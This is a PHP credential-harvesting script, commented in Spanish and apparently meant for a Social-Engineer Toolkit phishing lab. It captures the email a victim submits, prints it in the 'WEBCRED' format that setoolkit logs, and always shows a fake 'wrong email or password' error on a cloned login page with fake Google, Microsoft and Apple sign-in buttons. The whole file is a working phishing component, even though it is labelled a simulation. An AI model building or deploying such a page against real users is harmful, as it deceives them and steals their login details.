<?php
// ============================================
// SIMULACIÓN DE POST.PHP DE EMPRESA FICTICIA
// ============================================

// 1. CAPTURAR EL EMAIL ENVIADO POR EL FORMULARIO
$email = isset($_POST['email']) ? $_POST['email'] : '';

// 2. MOSTRAR EN FORMATO QUE SETOOLKIT ESPERA (para que lo capture)
if (!empty($email)) {
    echo "WEBCRED: EMAIL: $email\n";
}

// 3. SIMULAR VALIDACIÓN (siempre falla para que veas el mensaje)
$login_exitoso = false; // Siempre false para mostrar el error

// 4. DECIDIR QUÉ MOSTRAR
if ($login_exitoso) {
    // Si el login fuera exitoso (no pasa)
    header("Location: dashboard.php");
    exit;
} else {
    // Mostrar mensaje de error con HTML
    ?>
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Inicio de sesión - Matrix</title>
        <link rel="stylesheet" href="developer.css">
        <style>
            .error-msg {
                background-color: #fee2e2;
                color: #dc2626;
                padding: 12px;
                border-radius: 8px;
                margin-bottom: 16px;
                border: 1px solid #fecaca;
                font-weight: 500;
            }
        </style>
    </head>
    <body>
        <header class="navbar">
            <div class="logo">Matrix</div>
            <a href="#" class="btn-inicio"><i class="fa-solid fa-house"></i> Volver a inicio</a>
        </header>

        <main class="login-container">
            <h2>Inicia sesión</h2>
            <p class="subtitle">Ingresa tu información para continuar</p>

            <!-- MOSTRAR MENSAJE DE ERROR -->
            <div class="error-msg">
                <i class="fa-solid fa-circle-exclamation"></i>
                Correo electrónico o contraseña incorrectos. Por favor, inténtalo de nuevo.
            </div>

            <!-- FORMULARIO DE LOGIN (igual que el index.html) -->
            <form class="login-form" method="POST" action="post.php">
                <label for="user-input">Correo electrónico o celular</label>
                <input type="text" id="user-input" name="email" placeholder="Escribe tu correo o celular" value="<?php echo htmlspecialchars($email); ?>">
                <button type="submit" class="btn-submit">Inicia sesión</button>
            </form>

            <p class="register-text">¿No tienes una cuenta? <a href="registro.html">Regístrate</a></p>

            <div class="divider"><span>o</span></div>

            <div class="social-login">
                <button class="btn-social"><i class="fa-solid fa-fingerprint"></i> Continuar con acceso personal</button>
                <button class="btn-social"><i class="fa-brands fa-google"></i> Continuar con Google</button>
                <button class="btn-social"><i class="fa-brands fa-microsoft"></i> Continuar con Microsoft</button>
                <button class="btn-social"><i class="fa-brands fa-apple"></i> Continuar con Apple</button>
            </div>
        </main>
    </body>
    </html>
    <?php
}
?>
